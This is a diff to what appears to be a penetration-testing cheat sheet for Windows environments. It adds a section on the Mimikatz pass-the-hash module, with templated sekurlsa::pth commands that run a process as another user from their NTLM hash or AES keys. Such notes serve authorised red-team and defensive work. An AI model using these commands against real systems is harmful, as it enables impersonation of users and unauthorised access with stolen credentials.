@@ -40,6 +40,17 @@ Wait-Job $ProcessJob
 Receive-Job -Job $ProcessJob
 ```
 
+###### Mimikatz Pass-The-Hash
+
+The Pass-The-Hash module of `mimikatz` can be used to locally run a process
+under another user identity using its `NTLM` hash:
+
+```
+# Default to /run:cmd.exe
+sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN_FQDN> /ntlm:<HASH_NTLM> /run:<COMMAND>
+sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN_FQDN> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:<COMMAND>
+```
+
 ###### PowerShell Credential option
 
 Most of the PowerShell's `Remote Server Administration Tools (RSAT)` cmdlets
